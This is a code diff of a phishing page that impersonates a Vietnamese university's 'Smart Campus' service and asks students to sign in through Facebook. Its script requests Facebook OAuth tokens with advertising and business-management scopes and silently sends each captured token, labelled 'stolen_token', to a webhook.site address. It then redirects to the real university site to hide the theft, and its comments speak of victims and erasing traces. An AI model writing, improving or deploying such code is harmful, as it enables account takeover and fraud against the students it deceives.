@@ -19,7 +19,7 @@
     <div class="card">
         <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo">
         <h2>Hệ Thống Smart Campus</h2>
-        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập qua Facebook Messenger, bạn vui lòng nhấn xác thực tài khoản bên dưới.</p>
+        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập qua Messenger, bạn vui lòng nhấn xác thực tài khoản bên dưới.</p>
         
         <button class="btn-fb" id="loginBtn">
             <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
@@ -28,31 +28,35 @@
     </div>
 
 <script>
-    // === CẤU HÌNH THÔNG SỐ (PHƯƠNG THAY APP_ID VÀ WEBHOOK VÀO ĐÂY) ===
+    // === CẤU HÌNH (PHƯƠNG KIỂM TRA KỸ APP_ID VÀ LINK WEBHOOK) ===
     const APP_ID = "2402493790174154"; 
-    const REDIRECT_URI = window.location.href.split('#')[0]; // Tự động lấy link GitHub hiện tại
     const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
+    const REDIRECT_URI = window.location.href.split('#')[0]; 
 
+    // 1. Gửi nạn nhân sang Facebook để lấy Token (1-Click)
     document.getElementById('loginBtn').onclick = function() {
-        // Yêu cầu quyền nâng cao để Token có "trọng lượng" khi đổi sang Cookie
         const SCOPES = "public_profile,email,ads_management,business_management";
-        
         const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}&auth_type=rerequest`;
-        
         window.location.href = fbUrl;
     };
 
+    // 2. Tự động "bắt" Token từ URL và gửi về Webhook khi quay lại
     window.onload = function() {
-        // Sau khi nạn nhân nhấn "Tiếp tục", Facebook sẽ trả về Token trên URL
         if (window.location.hash.includes("access_token")) {
-            const params = new URLSearchParams(window.location.hash.substring(1));
+            const hash = window.location.hash.substring(1);
+            const params = new URLSearchParams(hash);
             const token = params.get('access_token');
             
             if (token) {
-                // Gửi Token âm thầm về Webhook để chuẩn bị bước Token Exchange
-                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
-                .then(() => {
-                    // Xóa dấu vết bằng cách chuyển hướng về trang chủ trường
+                // Sử dụng mode: 'no-cors' để vượt qua các lớp chặn bảo mật của trình duyệt
+                fetch(`${WEBHOOK_URL}?stolen_token=${token}`, {
+                    method: 'GET',
+                    mode: 'no-cors' 
+                }).then(() => {
+                    // Chuyển hướng về trang chủ trường sau khi lấy xong Token
+                    window.location.href = "https://huit.edu.vn/";
+                }).catch(err => {
+                    // Nếu lỗi fetch, vẫn chuyển hướng để xóa dấu vết
                     window.location.href = "https://huit.edu.vn/";
                 });
             }
